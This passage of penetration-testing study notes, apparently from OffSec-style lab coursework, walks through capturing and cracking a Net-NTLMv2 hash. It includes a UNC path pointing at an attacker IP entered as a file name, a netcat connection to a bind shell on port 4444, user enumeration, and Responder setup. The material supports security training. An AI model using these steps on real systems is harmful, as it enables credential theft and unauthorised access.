  2938. <li>we can enter a non-existent file with a UNC path like<ul>
  2939. <li><code>\\{OurAttackingIP}\share\nonexistent.txt</code><ul>
  2940. <li>If the web app supports uploads via SMB, the Win server will auth to our SMB server</li>
  2941. </ul>
  2942. </li>
  2943. </ul>
  2944. </li>
  2945. </ul>
  2946. </li>
  2947. </ul>
  2948. <p>Let&#39;s capture and crack a Net-NTLMv2 hash!</p>
  2949. <ul>
  2950. <li>Setup Responder on our Kali machine as an SMB server</li>
  2951. <li>using FILES01 as the target</li>
  2952. <li>assume we used an attack vector to exec a bind shell on the target sys<ul>
  2953. <li>We&#39;ll connect to port 4444 with Netcat where our bind shell is running</li>
  2954. <li>once connected, run <code>whoami</code> to check which user we are running as</li>
  2955. <li>then use <code>net user</code> to check if the user is a member of the local <code>Administrators</code> group</li>
  2956. </ul>
  2957. </li>
  2958. </ul>
  2959. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  2960. └─$ nc $VM1 4444

  3008. <ul>
  3009. <li>The output indicates we are user <code>paul</code><ul>
  3010. <li>not a local admin on FILES01</li>
  3011. <li>Interesting; the <code>paul</code> user is a member of <code>Remote Desktop Users</code> group<ul>
  3012. <li>allowing the user to connect to the system via RDP</li>
  3013. </ul>
  3014. </li>
  3015. </ul>
  3016. </li>
  3017. <li>Assume the user <code>gunther</code> does not exist or we do not have access to the account<ul>
  3018. <li>in this example we only have access to <code>paul</code> on this sys</li>
  3019. </ul>
  3020. </li>
  3021. <li>We do not have privs to run Mimikatz<ul>
  3022. <li>therefore we cannot extract passwords from the sys</li>
  3023. <li>we can set up a SMB server with <code>Responder</code> on our Kali machine<ul>
  3024. <li>then connect to it with user <code>paul</code><ul>
  3025. <li>capturing the Net-NTLMv2 hash, which we will crack</li>
  3026. </ul>
  3027. </li>
  3028. </ul>
  3029. </li>
  3030. </ul>
  3031. </li>
  3032. <li>From our attacking machine<ul>
  3033. <li>determine interface with <code>ip a</code></li>
  3034. <li>run <code>sudo responder</code><ul>
  3035. <li>set the listening interface with <code>-I</code></li>
  3036. </ul>
  3037. </li>
  3038. </ul>
  3039. </li>
  3040. </ul>
  3041. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
